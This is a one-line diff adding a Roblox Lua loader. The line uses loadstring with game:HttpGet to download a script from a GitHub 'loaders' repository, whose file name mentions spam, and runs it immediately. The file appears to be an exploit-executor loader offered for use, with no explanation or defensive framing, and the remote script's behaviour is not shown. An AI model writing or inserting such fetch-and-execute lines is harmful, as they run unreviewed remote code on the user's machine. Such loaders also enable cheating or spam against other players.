@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/sarab-spam3-nwm6bf37ex5xk6.lua"))()
